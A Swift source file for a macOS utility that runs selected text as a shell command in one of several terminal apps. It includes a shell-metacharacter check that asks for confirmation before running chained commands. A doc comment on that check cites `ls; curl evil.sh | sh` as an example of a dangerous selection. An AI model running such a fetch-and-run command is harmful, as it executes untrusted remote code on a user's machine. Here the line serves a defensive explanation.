import AppKit
import Darwin
import Dispatch
import Foundation

public enum SelectionBarTerminalApp: String, CaseIterable, Codable, Sendable {
  case terminal
  case iterm2
  case ghostty
  case alacritty
  case warp
  case kitty
  case wezterm

  public var displayName: String {
    switch self {
    case .terminal:
      return "Terminal"
    case .iterm2:
      return "iTerm2"
    case .ghostty:
      return "Ghostty"
    case .alacritty:
      return "Alacritty"
    case .warp:
      return "Warp"
    case .kitty:
      return "kitty"
    case .wezterm:
      return "WezTerm"
    }
  }

  fileprivate var bundleIdentifiers: [String] {
    switch self {
    case .terminal:
      return ["com.apple.Terminal"]
    case .ghostty:
      return ["com.mitchellh.ghostty"]
    case .warp:
      return ["dev.warp.Warp-Stable"]
    case .iterm2, .alacritty, .kitty, .wezterm:
      return []
    }
  }

  fileprivate var bundleNames: [String] {
    switch self {
    case .terminal:
      return ["Terminal.app"]
    case .iterm2:
      return ["iTerm.app", "iTerm2.app"]
    case .ghostty:
      return ["Ghostty.app"]
    case .alacritty:
      return ["Alacritty.app"]
    case .warp:
      return ["Warp.app"]
    case .kitty:
      return ["kitty.app", "Kitty.app"]
    case .wezterm:
      return ["WezTerm.app", "wezterm.app"]
    }
  }

  fileprivate var executableCandidates: [String] {
    switch self {
    case .terminal:
      return ["Terminal"]
    case .iterm2:
      return ["iTerm2", "iTerm"]
    case .ghostty:
      return ["ghostty"]
    case .alacritty:
      return ["alacritty"]
    case .warp:
      return ["Warp"]
    case .kitty:
      return ["kitty"]
    case .wezterm:
      return ["wezterm", "wezterm-gui"]
    }
  }
}

struct SelectionBarTerminalAppleScriptRequest: Sendable, Equatable {
  let source: String
  let arguments: [String]
}

struct SelectionBarTerminalFileWriteRequest: Sendable, Equatable {
  let fileURL: URL
  let contents: String
}

struct SelectionBarTerminalProcessRequest: Sendable, Equatable {
  let executableURL: URL
  let arguments: [String]
  let currentDirectoryURL: URL?
  let environment: [String: String]?
}

struct SelectionBarTerminalLaunchPlan: Sendable, Equatable {
  let fileWrites: [SelectionBarTerminalFileWriteRequest]
  let appleScriptRequest: SelectionBarTerminalAppleScriptRequest?
  let processRequest: SelectionBarTerminalProcessRequest?
  let openURL: URL?
  let cleanupURLs: [URL]

  init(
    fileWrites: [SelectionBarTerminalFileWriteRequest] = [],
    appleScriptRequest: SelectionBarTerminalAppleScriptRequest? = nil,
    processRequest: SelectionBarTerminalProcessRequest? = nil,
    openURL: URL? = nil,
    cleanupURLs: [URL] = []
  ) {
    self.fileWrites = fileWrites
    self.appleScriptRequest = appleScriptRequest
    self.processRequest = processRequest
    self.openURL = openURL
    self.cleanupURLs = cleanupURLs
  }
}

public enum SelectionBarTerminalCommandServiceError: LocalizedError, Sendable, Equatable {
  case emptySelection
  case commandNotRunnable
  case terminalUnavailable(SelectionBarTerminalApp)
  case missingEmbeddedExecutable(SelectionBarTerminalApp)
  case failedToOpenLaunchURL
  case appleScriptFailed(String)
  case processLaunchFailed(String)

  public var errorDescription: String? {
    switch self {
    case .emptySelection:
      return "Selection is empty."
    case .commandNotRunnable:
      return "Selected text does not start with an installed executable."
    case .terminalUnavailable(let app):
      return "\(app.displayName) is not installed."
    case .missingEmbeddedExecutable(let app):
      return "Unable to locate the embedded executable for \(app.displayName)."
    case .failedToOpenLaunchURL:
      return "Failed to open the terminal launch URL."
    case .appleScriptFailed(let message):
      return "AppleScript launch failed: \(message)"
    case .processLaunchFailed(let message):
      return "Terminal launch failed: \(message)"
    }
  }
}

@MainActor
struct SelectionBarTerminalCommandService {
  typealias AppURLResolver = (SelectionBarTerminalApp, URL) -> URL?
  typealias LoginShellCommandResolver = @Sendable (String, String) -> URL?
  typealias AppleScriptRunner = (SelectionBarTerminalAppleScriptRequest) async throws -> Void
  typealias ProcessRunner = (SelectionBarTerminalProcessRequest) throws -> Void
  typealias FileWriter = (SelectionBarTerminalFileWriteRequest) throws -> Void
  typealias CleanupScheduler = ([URL]) -> Void

  nonisolated private static let loginShellResolutionTimeout: DispatchTimeInterval = .seconds(2)
  nonisolated private static let loginShellTerminationGracePeriod: DispatchTimeInterval =
    .milliseconds(200)

  private let homeDirectoryProvider: () -> URL
  private let environmentProvider: () -> [String: String]
  private let appURLResolver: AppURLResolver
  private let loginShellCommandResolver: LoginShellCommandResolver
  private let appleScriptRunner: AppleScriptRunner
  private let processRunner: ProcessRunner
  private let fileWriter: FileWriter
  private let urlOpener: (URL) -> Bool
  private let cleanupScheduler: CleanupScheduler

  init(
    homeDirectoryProvider: @escaping () -> URL = {
      URL(fileURLWithPath: NSHomeDirectory(), isDirectory: true)
    },
    environmentProvider: @escaping () -> [String: String] = {
      ProcessInfo.processInfo.environment
    },
    appURLResolver: @escaping AppURLResolver = { app, homeDirectory in
      Self.defaultAppURL(for: app, homeDirectory: homeDirectory)
    },
    loginShellCommandResolver: @escaping LoginShellCommandResolver = { token, shellPath in
      Self.resolveExecutableInLoginShell(token: token, shellPath: shellPath)
    },
    appleScriptRunner: @escaping AppleScriptRunner = { request in
      try await Self.runAppleScript(request)
    },
    processRunner: @escaping ProcessRunner = { request in
      try Self.runProcess(request)
    },
    fileWriter: @escaping FileWriter = { request in
      try Self.writeFile(request)
    },
    urlOpener: @escaping (URL) -> Bool = { url in
      NSWorkspace.shared.open(url)
    },
    cleanupScheduler: @escaping CleanupScheduler = { urls in
      Self.scheduleCleanup(for: urls)
    }
  ) {
    self.homeDirectoryProvider = homeDirectoryProvider
    self.environmentProvider = environmentProvider
    self.appURLResolver = appURLResolver
    self.loginShellCommandResolver = loginShellCommandResolver
    self.appleScriptRunner = appleScriptRunner
    self.processRunner = processRunner
    self.fileWriter = fileWriter
    self.urlOpener = urlOpener
    self.cleanupScheduler = cleanupScheduler
  }

  func availableTerminalApps() -> [SelectionBarTerminalApp] {
    let homeDirectory = homeDirectoryProvider()
    return SelectionBarTerminalApp.allCases.filter { app in
      appURLResolver(app, homeDirectory) != nil
    }
  }

  func appURL(for app: SelectionBarTerminalApp) -> URL? {
    appURLResolver(app, homeDirectoryProvider())
  }

  func canRunCommand(
    text: String,
    terminalApp: SelectionBarTerminalApp? = nil
  ) async -> Bool {
    guard let terminalApp else {
      return await runnableExecutableURL(from: text) != nil
    }
    guard appURL(for: terminalApp) != nil else { return false }
    return await runnableExecutableURL(from: text) != nil
  }

  func launchCommand(
    text: String,
    terminalApp: SelectionBarTerminalApp
  ) async throws {
    let plan = try await makeLaunchPlan(text: text, terminalApp: terminalApp)

    for request in plan.fileWrites {
      try fileWriter(request)
    }

    if let appleScriptRequest = plan.appleScriptRequest {
      try await appleScriptRunner(appleScriptRequest)
    }

    if let processRequest = plan.processRequest {
      try processRunner(processRequest)
    }

    if let openURL = plan.openURL, !urlOpener(openURL) {
      throw SelectionBarTerminalCommandServiceError.failedToOpenLaunchURL
    }

    if !plan.cleanupURLs.isEmpty {
      cleanupScheduler(plan.cleanupURLs)
    }
  }

  func makeLaunchPlan(
    text: String,
    terminalApp: SelectionBarTerminalApp
  ) async throws -> SelectionBarTerminalLaunchPlan {
    let command = preparedCommandText(from: text)
    guard !command.isEmpty else {
      throw SelectionBarTerminalCommandServiceError.emptySelection
    }

    let homeDirectory = homeDirectoryProvider()
    guard let appURL = appURLResolver(terminalApp, homeDirectory) else {
      throw SelectionBarTerminalCommandServiceError.terminalUnavailable(terminalApp)
    }
    guard await runnableExecutableURL(from: command) != nil else {
      throw SelectionBarTerminalCommandServiceError.commandNotRunnable
    }

    switch terminalApp {
    case .terminal:
      return SelectionBarTerminalLaunchPlan(
        appleScriptRequest: SelectionBarTerminalAppleScriptRequest(
          source: Self.terminalAppleScript,
          arguments: [command]
        )
      )

    case .iterm2:
      return SelectionBarTerminalLaunchPlan(
        appleScriptRequest: SelectionBarTerminalAppleScriptRequest(
          source: Self.iTerm2AppleScript,
          arguments: [command]
        )
      )

    case .ghostty:
      return SelectionBarTerminalLaunchPlan(
        appleScriptRequest: SelectionBarTerminalAppleScriptRequest(
          source: Self.ghosttyAppleScript,
          arguments: [command]
        )
      )

    case .alacritty:
      let executableURL =
        try embeddedExecutableURL(for: .alacritty, appURL: appURL)
      let shellPath = loginShellPath()
      return SelectionBarTerminalLaunchPlan(
        processRequest: SelectionBarTerminalProcessRequest(
          executableURL: executableURL,
          arguments: [
            "--hold", "--working-directory", homeDirectory.path, "-e", shellPath, "-lc",
            command,
          ],
          currentDirectoryURL: nil,
          environment: nil
        )
      )

    case .warp:
      let shellPath = loginShellPath()
      let configURL = warpLaunchConfigurationURL(homeDirectory: homeDirectory)
      let warpCommand = "\(shellPath) -lc \(Self.shellSingleQuoted(command))"
      let yaml = Self.warpLaunchConfigurationYAML(
        homeDirectory: homeDirectory.path,
        command: warpCommand
      )
      guard let launchURL = Self.warpLaunchURL(for: configURL) else {
        throw SelectionBarTerminalCommandServiceError.failedToOpenLaunchURL
      }
      return SelectionBarTerminalLaunchPlan(
        fileWrites: [
          SelectionBarTerminalFileWriteRequest(
            fileURL: configURL,
            contents: yaml
          )
        ],
        openURL: launchURL,
        cleanupURLs: [configURL]
      )

    case .kitty:
      let executableURL = try embeddedExecutableURL(for: .kitty, appURL: appURL)
      let shellPath = loginShellPath()
      return SelectionBarTerminalLaunchPlan(
        processRequest: SelectionBarTerminalProcessRequest(
          executableURL: executableURL,
          arguments: ["--hold", "--directory", homeDirectory.path, shellPath, "-lc", command],
          currentDirectoryURL: nil,
          environment: nil
        )
      )

    case .wezterm:
      let executableURL = try embeddedExecutableURL(for: .wezterm, appURL: appURL)
      let shellPath = loginShellPath()
      return SelectionBarTerminalLaunchPlan(
        processRequest: SelectionBarTerminalProcessRequest(
          executableURL: executableURL,
          arguments: ["start", "--cwd", homeDirectory.path, "--", shellPath, "-lc", command],
          currentDirectoryURL: nil,
          environment: nil
        )
      )
    }
  }

  private func runnableExecutableURL(from text: String) async -> URL? {
    let environment = environmentProvider()
    let shellPath = loginShellPath()
    let resolver = loginShellCommandResolver
    return await Task.detached(priority: .userInitiated) {
      Self.runnableExecutableURL(
        from: text,
        environment: environment,
        shellPath: shellPath,
        loginShellCommandResolver: resolver
      )
    }.value
  }

  func firstRunnableToken(from text: String) -> String? {
    let firstLine = Self.firstNonEmptyLine(in: text)
    let tokens = Self.shellTokens(in: firstLine)
    guard !tokens.isEmpty else { return nil }

    for token in tokens {
      if Self.isEnvironmentAssignment(token) {
        continue
      }
      let trimmed = token.trimmingCharacters(in: .whitespacesAndNewlines)
      return trimmed.isEmpty ? nil : trimmed
    }
    return nil
  }

  private func preparedCommandText(from text: String) -> String {
    Self.preparedCommandText(from: text)
  }

  nonisolated static func preparedCommandText(from text: String) -> String {
    text.trimmingCharacters(in: .whitespacesAndNewlines)
  }

  nonisolated private static func firstNonEmptyLine(in text: String) -> String {
    let trimmed = text.trimmingCharacters(in: .whitespacesAndNewlines)
    for line in trimmed.split(separator: "\n", omittingEmptySubsequences: false) {
      let candidate = String(line).trimmingCharacters(in: .whitespacesAndNewlines)
      if !candidate.isEmpty {
        return candidate
      }
    }
    return ""
  }

  nonisolated private static func runnableExecutableURL(
    from text: String,
    environment: [String: String],
    shellPath: String,
    loginShellCommandResolver: LoginShellCommandResolver
  ) -> URL? {
    guard let token = firstRunnableToken(in: text) else { return nil }
    return resolveExecutable(
      token: token,
      environment: environment,
      shellPath: shellPath,
      loginShellCommandResolver: loginShellCommandResolver
    )
  }

  nonisolated private static func firstRunnableToken(in text: String) -> String? {
    let firstLine = firstNonEmptyLine(in: text)
    let tokens = shellTokens(in: firstLine)
    guard !tokens.isEmpty else { return nil }

    for token in tokens {
      if isEnvironmentAssignment(token) {
        continue
      }
      let trimmed = token.trimmingCharacters(in: .whitespacesAndNewlines)
      return trimmed.isEmpty ? nil : trimmed
    }
    return nil
  }

  nonisolated private static func resolveExecutable(
    token: String,
    environment: [String: String],
    shellPath: String,
    loginShellCommandResolver: LoginShellCommandResolver
  ) -> URL? {
    guard !token.isEmpty else { return nil }

    if token.hasPrefix("/") {
      let url = URL(fileURLWithPath: token)
      return Self.isExecutableFile(url) ? url : nil
    }

    guard !token.contains("/") else {
      return nil
    }

    let path = environment["PATH"] ?? Self.defaultPATH
    for directory in path.split(separator: ":") where !directory.isEmpty {
      let candidate = URL(fileURLWithPath: String(directory), isDirectory: true)
        .appendingPathComponent(token)
      if Self.isExecutableFile(candidate) {
        return candidate
      }
    }

    // Falling through to a login shell is expensive — it forks `$SHELL -lc`,
    // which sources the user's rc files. Every ordinary prose selection reaches
    // here, so screen out anything that cannot be a command name first, and
    // memoize the answer (including misses) for the tokens that survive.
    guard Self.isPlausibleCommandName(token) else { return nil }
    return Self.cachedLoginShellResolution(token: token, shellPath: shellPath) {
      loginShellCommandResolver(token, shellPath)
    }
  }

  /// Whether running this selection warrants an explicit confirmation.
  ///
  /// Only the *first* token is ever validated against `PATH`; the rest of the
  /// selection is handed verbatim to `$SHELL -lc`, so `ls; curl evil.sh | sh`
  /// passes the runnable check. Since the input is arbitrary text the user
  /// selected — often on a web page they do not control — anything that can
  /// chain, substitute or redirect gets a confirmation prompt. A plain
  /// single command stays one click.
  nonisolated static func requiresConfirmation(for text: String) -> Bool {
    let command = preparedCommandText(from: text)
    guard !command.isEmpty else { return false }

    // More than one line means more than one command.
    if command.contains(where: \.isNewline) { return true }

    // Backslashes can smuggle any of the below past a naive reading.
    if command.contains("\\") { return true }

    var inSingleQuote = false
    var inDoubleQuote = false
    for character in command {
      switch character {
      case "'" where !inDoubleQuote:
        inSingleQuote.toggle()
      case "\"" where !inSingleQuote:
        inDoubleQuote.toggle()
      case ";", "|", "&", "`", ">", "<", "(", ")", "{", "}", "\n":
        // Quoted metacharacters are inert, so only flag bare ones.
        if !inSingleQuote && !inDoubleQuote { return true }
      case "$":
        // `$(...)` and `$VAR` both expand; single quotes suppress that.
        if !inSingleQuote { return true }
      default:
        continue
      }
    }

    // An unbalanced quote means the shell will not parse this the way it reads.
    return inSingleQuote || inDoubleQuote
  }

  /// Cheap structural test for "could this token name an executable?".
  /// Executable names are short and drawn from a narrow character set; prose
  /// words, punctuation and URLs are rejected without forking anything.
  nonisolated static func isPlausibleCommandName(_ token: String) -> Bool {
    guard !token.isEmpty, token.count <= 64 else { return false }
    return token.unicodeScalars.allSatisfy { scalar in
      CharacterSet.alphanumerics.contains(scalar)
        || scalar == "." || scalar == "_" || scalar == "-" || scalar == "+"
    }
  }

  private nonisolated(unsafe) static var loginShellResolutionCache: [String: URL?] = [:]
  private nonisolated static let loginShellResolutionCacheLock = NSLock()
  private nonisolated static let loginShellResolutionCacheLimit = 256

  nonisolated private static func cachedLoginShellResolution(
    token: String,
    shellPath: String,
    resolve: () -> URL?
  ) -> URL? {
    let key = "\(shellPath)\t\(token)"

    loginShellResolutionCacheLock.lock()
    let cached = loginShellResolutionCache[key]
    loginShellResolutionCacheLock.unlock()
    if let cached { return cached }

    let resolved = resolve()

    loginShellResolutionCacheLock.lock()
    if loginShellResolutionCache.count >= loginShellResolutionCacheLimit {
      loginShellResolutionCache.removeAll(keepingCapacity: true)
    }
    loginShellResolutionCache[key] = resolved
    loginShellResolutionCacheLock.unlock()

    return resolved
  }

  private func embeddedExecutableURL(
    for app: SelectionBarTerminalApp,
    appURL: URL
  ) throws -> URL {
    for name in app.executableCandidates {
      let candidate =
        appURL
        .appendingPathComponent("Contents")
        .appendingPathComponent("MacOS")
        .appendingPathComponent(name)
      if FileManager.default.fileExists(atPath: candidate.path) {
        return candidate
      }
    }

    throw SelectionBarTerminalCommandServiceError.missingEmbeddedExecutable(app)
  }

  func loginShellPath() -> String {
    if let shell = Self.pwShellPath(), !shell.isEmpty {
      return shell
    }
    let envShell = environmentProvider()["SHELL"]?.trimmingCharacters(in: .whitespacesAndNewlines)
    if let envShell, !envShell.isEmpty {
      return envShell
    }
    return "/bin/zsh"
  }

  private func warpLaunchConfigurationURL(homeDirectory: URL) -> URL {
    homeDirectory
      .appendingPathComponent(".warp", isDirectory: true)
      .appendingPathComponent("launch_configurations", isDirectory: true)
      .appendingPathComponent("selectionbar-run-command-\(UUID().uuidString).yaml")
  }

  private static func warpLaunchURL(for fileURL: URL) -> URL? {
    let encodedPath = fileURL.path.addingPercentEncoding(withAllowedCharacters: .urlPathAllowed)
    guard let encodedPath else { return nil }
    return URL(string: "warp://launch/\(encodedPath)")
  }

  nonisolated private static func isExecutableFile(_ url: URL) -> Bool {
    var isDirectory: ObjCBool = false
    guard FileManager.default.fileExists(atPath: url.path, isDirectory: &isDirectory),
      !isDirectory.boolValue
    else {
      return false
    }
    return FileManager.default.isExecutableFile(atPath: url.path)
  }

  nonisolated private static func resolveExecutableInLoginShell(
    token: String,
    shellPath: String
  ) -> URL? {
    guard !token.isEmpty else { return nil }
    guard FileManager.default.isExecutableFile(atPath: shellPath) else { return nil }

    let process = Process()
    process.executableURL = URL(fileURLWithPath: shellPath)
    process.arguments = ["-lc", "command -v -- \"$1\"", "selectionbar", token]

    let outputPipe = Pipe()
    let completion = DispatchSemaphore(value: 0)
    process.standardOutput = outputPipe
    process.standardError = FileHandle.nullDevice
    process.standardInput = FileHandle.nullDevice
    process.terminationHandler = { _ in
      completion.signal()
    }

    do {
      try process.run()
    } catch {
      return nil
    }

    if completion.wait(timeout: .now() + Self.loginShellResolutionTimeout) == .timedOut {
      if process.isRunning {
        process.terminate()
      }
      _ = completion.wait(timeout: .now() + Self.loginShellTerminationGracePeriod)
      return nil
    }
    guard process.terminationStatus == 0 else { return nil }

    let data = outputPipe.fileHandleForReading.readDataToEndOfFile()
    guard
      let output = String(data: data, encoding: .utf8)?
        .trimmingCharacters(in: .whitespacesAndNewlines),
      output.hasPrefix("/")
    else {
      return nil
    }

    let url = URL(fileURLWithPath: output)
    return isExecutableFile(url) ? url : nil
  }

  nonisolated private static func shellTokens(in line: String) -> [String] {
    enum State {
      case normal
      case singleQuote
      case doubleQuote
    }

    var tokens: [String] = []
    var current = ""
    var state = State.normal
    var isEscaping = false

    func flushCurrentToken() {
      guard !current.isEmpty else { return }
      tokens.append(current)
      current = ""
    }

    for character in line {
      if isEscaping {
        current.append(character)
        isEscaping = false
        continue
      }

      switch state {
      case .normal:
        if character.isWhitespace {
          flushCurrentToken()
        } else if character == "'" {
          state = .singleQuote
        } else if character == "\"" {
          state = .doubleQuote
        } else if character == "\\" {
          isEscaping = true
        } else {
          current.append(character)
        }
      case .singleQuote:
        if character == "'" {
          state = .normal
        } else {
          current.append(character)
        }
      case .doubleQuote:
        if character == "\"" {
          state = .normal
        } else if character == "\\" {
          isEscaping = true
        } else {
          current.append(character)
        }
      }
    }

    if isEscaping {
      current.append("\\")
    }

    flushCurrentToken()
    return tokens
  }

  nonisolated private static func isEnvironmentAssignment(_ token: String) -> Bool {
    guard let equalsIndex = token.firstIndex(of: "="), equalsIndex != token.startIndex else {
      return false
    }

    let key = token[..<equalsIndex]
    guard let firstCharacter = key.first else { return false }
    guard firstCharacter == "_" || firstCharacter.isLetter else { return false }

    return key.dropFirst().allSatisfy { character in
      character == "_" || character.isLetter || character.isNumber
    }
  }

  nonisolated private static func pwShellPath() -> String? {
    guard let passwd = getpwuid(getuid()), let shellPointer = passwd.pointee.pw_shell else {
      return nil
    }
    return String(cString: shellPointer)
  }

  static func defaultAppURL(
    for app: SelectionBarTerminalApp,
    homeDirectory: URL
  ) -> URL? {
    for bundleIdentifier in app.bundleIdentifiers {
      if let resolvedURL = NSWorkspace.shared.urlForApplication(
        withBundleIdentifier: bundleIdentifier)
      {
        return resolvedURL
      }
    }

    for searchDirectory in searchDirectories(homeDirectory: homeDirectory) {
      for bundleName in app.bundleNames {
        let candidate = searchDirectory.appendingPathComponent(bundleName, isDirectory: true)
        if FileManager.default.fileExists(atPath: candidate.path) {
          return candidate
        }
      }
    }

    return nil
  }

  private static func searchDirectories(homeDirectory: URL) -> [URL] {
    [
      URL(fileURLWithPath: "/Applications", isDirectory: true),
      URL(fileURLWithPath: "/System/Applications", isDirectory: true),
      URL(fileURLWithPath: "/System/Applications/Utilities", isDirectory: true),
      homeDirectory.appendingPathComponent("Applications", isDirectory: true),
    ]
  }

  /// `nonisolated` and continuation-based on purpose: osascript has to
  /// cold-launch Terminal/iTerm2/Ghostty, which takes seconds. Inheriting
  /// `@MainActor` and blocking in `waitUntilExit()` beachballed the whole UI on
  /// every "Run command".
  nonisolated static func runAppleScript(_ request: SelectionBarTerminalAppleScriptRequest)
    async throws
  {
    let process = Process()
    process.executableURL = URL(fileURLWithPath: "/usr/bin/osascript")
    process.arguments = ["-"] + request.arguments

    let inputPipe = Pipe()
    let errorPipe = Pipe()

    process.standardInput = inputPipe
    process.standardOutput = FileHandle.nullDevice
    process.standardError = errorPipe

    try await withCheckedThrowingContinuation {
      (continuation: CheckedContinuation<Void, Error>) in
      process.terminationHandler = { finished in
        guard finished.terminationStatus == 0 else {
          let errorData = errorPipe.fileHandleForReading.readDataToEndOfFile()
          let errorText =
            String(data: errorData, encoding: .utf8)?
            .trimmingCharacters(in: .whitespacesAndNewlines)
          continuation.resume(
            throwing: SelectionBarTerminalCommandServiceError.appleScriptFailed(
              errorText?.isEmpty == false
                ? errorText! : "exit status \(finished.terminationStatus)"
            )
          )
          return
        }
        continuation.resume()
      }

      do {
        try process.run()
      } catch {
        process.terminationHandler = nil
        continuation.resume(
          throwing: SelectionBarTerminalCommandServiceError.appleScriptFailed(
            error.localizedDescription
          )
        )
        return
      }

      if let data = request.source.data(using: .utf8) {
        inputPipe.fileHandleForWriting.write(data)
      }
      try? inputPipe.fileHandleForWriting.close()
    }
  }

  nonisolated static func runProcess(_ request: SelectionBarTerminalProcessRequest) throws {
    let process = Process()
    process.executableURL = request.executableURL
    process.arguments = request.arguments
    process.currentDirectoryURL = request.currentDirectoryURL
    process.standardOutput = FileHandle.nullDevice
    process.standardError = FileHandle.nullDevice
    process.standardInput = FileHandle.nullDevice

    if let environment = request.environment {
      process.environment = environment
    }

    do {
      try process.run()
    } catch {
      throw SelectionBarTerminalCommandServiceError.processLaunchFailed(error.localizedDescription)
    }
  }

  nonisolated static func writeFile(_ request: SelectionBarTerminalFileWriteRequest) throws {
    let directoryURL = request.fileURL.deletingLastPathComponent()
    try FileManager.default.createDirectory(
      at: directoryURL,
      withIntermediateDirectories: true
    )
    try request.contents.write(to: request.fileURL, atomically: true, encoding: .utf8)
  }

  static func scheduleCleanup(for fileURLs: [URL]) {
    guard !fileURLs.isEmpty else { return }
    // Sweep leftovers from earlier runs first: if the app quit before a
    // deferred cleanup fired, the launch config — which contains the user's
    // shell command — would otherwise sit in ~/.warp indefinitely.
    removeOrphanedLaunchConfigurations(besides: Set(fileURLs))
    Task.detached(priority: .utility) {
      try? await Task.sleep(for: .seconds(30))
      for fileURL in fileURLs {
        try? FileManager.default.removeItem(at: fileURL)
      }
    }
  }

  /// Deletes `selectionbar-run-command-*.yaml` files left behind by previous
  /// runs, keeping the ones this launch is still using.
  private static func removeOrphanedLaunchConfigurations(besides live: Set<URL>) {
    let livePaths = Set(live.map(\.standardizedFileURL.path))
    let directories = Set(live.map { $0.deletingLastPathComponent().standardizedFileURL })
    for directory in directories {
      let contents = try? FileManager.default.contentsOfDirectory(
        at: directory,
        includingPropertiesForKeys: nil
      )
      for fileURL in contents ?? [] {
        guard fileURL.lastPathComponent.hasPrefix("selectionbar-run-command-"),
          fileURL.pathExtension == "yaml",
          !livePaths.contains(fileURL.standardizedFileURL.path)
        else { continue }
        try? FileManager.default.removeItem(at: fileURL)
      }
    }
  }

  private static func warpLaunchConfigurationYAML(
    homeDirectory: String,
    command: String
  ) -> String {
    let indentedCommand =
      command
      .split(separator: "\n", omittingEmptySubsequences: false)
      .map { "                \($0)" }
      .joined(separator: "\n")

    return """
      ---
      name: \(yamlDoubleQuoted("SelectionBar Run Command"))
      windows:
        - tabs:
            - title: \(yamlDoubleQuoted("Run Command"))
              layout:
                cwd: \(yamlDoubleQuoted(homeDirectory))
                commands:
                  - exec: |
      \(indentedCommand)
      """
  }

  private static func yamlDoubleQuoted(_ value: String) -> String {
    let escaped =
      value
      .replacingOccurrences(of: "\\", with: "\\\\")
      .replacingOccurrences(of: "\"", with: "\\\"")
    return "\"\(escaped)\""
  }

  private static func shellSingleQuoted(_ value: String) -> String {
    "'\(value.replacingOccurrences(of: "'", with: "'\"'\"'"))'"
  }

  nonisolated private static let defaultPATH =
    "/usr/local/bin:/opt/homebrew/bin:/usr/bin:/bin:/usr/sbin:/sbin"

  private static let terminalAppleScript = """
    on run argv
      set theCommand to item 1 of argv
      set terminalIsRunning to application "Terminal" is running
      tell application "Terminal"
        if terminalIsRunning then
          if (count of windows) > 0 then
            activate
            do script theCommand in front window
          else
            do script theCommand
            activate
          end if
        else
          do script theCommand
          activate
        end if
      end tell
    end run
    """

  private static let iTerm2AppleScript = """
    on run argv
      set theCommand to item 1 of argv
      set iTermIsRunning to application "iTerm2" is running
      tell application "iTerm2"
        if iTermIsRunning then
          if (count of windows) > 0 then
            activate
            tell current window
              create tab with default profile command theCommand
            end tell
          else
            create window with default profile command theCommand
            activate
          end if
        else
          create window with default profile command theCommand
          activate
        end if
      end tell
    end run
    """

  private static let ghosttyAppleScript = """
    on run argv
      set theCommand to item 1 of argv
      set ghosttyIsRunning to application "Ghostty" is running
      tell application "Ghostty"
        set cfg to new surface configuration
        set initial input of cfg to theCommand & "\\n"
        if ghosttyIsRunning then
          if (count of windows) > 0 then
            activate
            new tab in front window with configuration cfg
          else
            new window with configuration cfg
            activate
          end if
        else
          new window with configuration cfg
          activate
        end if
      end tell
    end run
    """
}
